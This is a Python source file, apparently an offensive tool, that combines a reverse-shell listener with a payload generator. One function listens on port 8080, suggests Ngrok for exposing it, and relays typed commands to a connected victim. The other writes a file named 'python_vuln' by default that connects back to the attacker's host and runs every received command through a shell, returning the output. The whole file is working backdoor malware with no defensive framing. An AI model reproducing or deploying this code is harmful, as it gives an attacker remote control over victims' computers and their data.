import socket

def exploit_format():
    host = input("local host for remote: ")
    port = 8080
    print("[+] Server Backdoor Listenning on port 8080")
    print("[+] you can use Ngrok to make it public")
    print("[+] Listen...")
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.bind((host, port))
        s.listen(1)
        print("Server Is OK")
        conn, addr = s.accept()
        print("[+] Found Target :", addr[0], addr[1])
        while True:
            shell = input("shell > ")
            conn.send(shell.encode())
            output = conn.recv(1024)
            print("\n" + output.decode())

def generator_format():
    host = input("Connect Host : ")
    port = 8080
    format_name = input("File Name ( default : python_vuln ) >>> ")
    print(f"[+] start generator format...")
    source = f'''# By Dora
import socket
import os
import subprocess

os.system('clear')
host = '{host}'
port = {port}

while True:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    while True:
        print("connected")
        output = s.recv(1024)
        data = subprocess.Popen(output.decode(), shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
        d = data.stderr.read() + data.stdout.read()
        s.send(d)
'''
    with open(f'{format_name}.py', 'w') as save:
        save.write(source)
